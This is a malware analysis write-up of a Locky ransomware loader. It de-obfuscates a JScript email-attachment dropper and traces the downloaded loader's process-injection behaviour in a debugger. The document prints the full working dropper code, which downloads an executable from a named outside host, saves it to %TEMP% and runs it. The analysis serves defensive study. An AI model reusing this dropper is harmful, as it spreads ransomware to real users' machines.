# Locky Loader Analysis
Loader analysis of the ransomware thread (Locky family)

I will start my analysis from a zip file (appears to be mainly delivered by email) that contains 2 files:

    Warning/ticket_973359216.js
    Warning /822_ticket_295979844.lib
    

![Virustotal](https://github.com/invictus1306/LockyAnalysis/blob/master/05.jpg)

Let start with the analysis of the Jscript:

    Warning/ticket_973359216.js

![CreateProcess](https://github.com/invictus1306/LockyAnalysis/blob/master/04.jpg)

As you can see the code of the Jscript file is obfuscated, we look in more details into Jscript file for Manually De-Obfuscating. There is the function “KeepData” that essentially execute the unescape() command.

```
function keepData(th) {
    return unescape(th);
}
```

Then after unescape all content, and replace every variable with the defined values the code become almost clear. For example see follow code

```
noCloneChecked = (function nodeIndex(){}, 3);

handleObj = (function nodeIndex.elemLang(){var percent= []["constructor"]["prototype"]["sort"]["apply"]();

return percent;

}, "dy");
```

With this function you can create your object.

For example for invoke “Echo” Jscript function:

```
WScript.Echo(“data”)
```

You can use follow syntax:

```
test = nodeIndex.elemLang()
test["WScript"]["Echo"]("data");
```

This is the de-obfuscate code

```
noCloneChecked = (function nodeIndex(){}, 3);

handleObj = (function nodeIndex.elemLang(){var percent= []["constructor"]["prototype"]["sort"]["apply"]();

return percent;

}, "dy");

rjsonp = hasDuplicate = rquery = nodeIndex.elemLang();

radioValue = rquery["WScript"]["CreateObject"]("WScript.Shell"); //WScript.CreateObject("WScript.Shell")

opt = radioValue["ExpandEnvironmentStrings"]("%TEMP%/") + "test.scr"; // radioValue.ExpandEnvironmentStrings("%TEMP%") + "test.scr"

attrHandle = rquery["WScript"]["CreateObject"]("ADODB.Stream"); //WScript.CreateObject("ADODB.Stream")

attrHandle["mode"] = 3; //Indicates read/write permissions attrHandle.mode = 3

attrHandle["type"] = 1; //Evaluates CommandText as a textual definition of a command or stored procedure call. attrHandle.type = 1

scripts = ["Msxml2.ServerXMLHTTP .6.0", "Msxml2.XMLHTTP.6.0", "Msxml2.ServerXMLHTTP.3.0", "Msxml2.XML" + "HTTP.3.0", "Msxml2.XMLHTTP", "Microsoft.XMLHTTP"];

for (getElementsByClassName = 0; getElementsByClassName < scripts["length"]; getElementsByClassName++)

{

try {

what = hasDuplicate["WScript"]["CreateObject"](scripts[getElementsByClassName]); //WScript.CreateObject("...") for every scripts element

what["open"]("GET", "http://runningmoustache.com/zWbD_F.exe", false); // what.open(...)

what["send"](); // what.send()

break;

} catch (inArray) {}

}

while (what["readyState"] != 4) // value 4: ReadyStateComplete all the data has been received.

hasDuplicate["WScript"]["Sleep"](100); // WScript.Sleep(100)

if (what["status"] == 200) {

attrHandle["open"](); //attrHandle.Open()

attrHandle["Write"](what["responseBody"]); //attrHandle.Write(what.responseBody)

rjsonp["WScript"]["Sleep"](5000); //WScript.Sleep(5000)

attrHandle["SaveToFile"](opt, (232,77,231,2)); //attrHandle.SaveToFile(...)

rjsonp["WScript"]["Sleep"](5000); //WScript.Sleep(5000)

radioValue["Run"](opt); //radioValue.Run(opt)

} else {}
```
This is the deobfuscated file:

![JS file](https://github.com/invictus1306/LockyAnalysis/blob/master/jsDeo.js)

In a few words what that does the script is:

    HTTP GET request
    Download and save in %TEMP% path the executable file (file name: test.src)
    
As you have seen before, after the auto run of the JScript file, the test.src PE file, came download into %TEMP% folder.

It’s the time to analyze the test.src PE file.

When this file is launch you can see only one section:

![PE file](https://github.com/invictus1306/LockyAnalysis/blob/master/00.jpg)

Analyzing the behaviors, it possible understand that it is a loader, indeed after unpack/decrypt the original exe file in memory, the loaders usually launch a child process in suspend mode. But let’s go into the code, the first interesting API is CreateProcessA, then set a breakpoint

![CreateProcess](https://github.com/invictus1306/LockyAnalysis/blob/master/01.jpg)

As we expected another process in suspend mode is going to be created

![Other Process](https://github.com/invictus1306/LockyAnalysis/blob/master/02.jpg)

Then after re-allocate the memory with the size of the new exe, I except the overwrite or the allocation of extra memory of the new child process, with the decrypted code of the malware, in fact, going on with debugging you can find this API call

![Dump new process](https://github.com/invictus1306/LockyAnalysis/blob/master/03.jpg)

Then the memory area of the new child process begin to be allocated with the new code (the Locky ransomware)
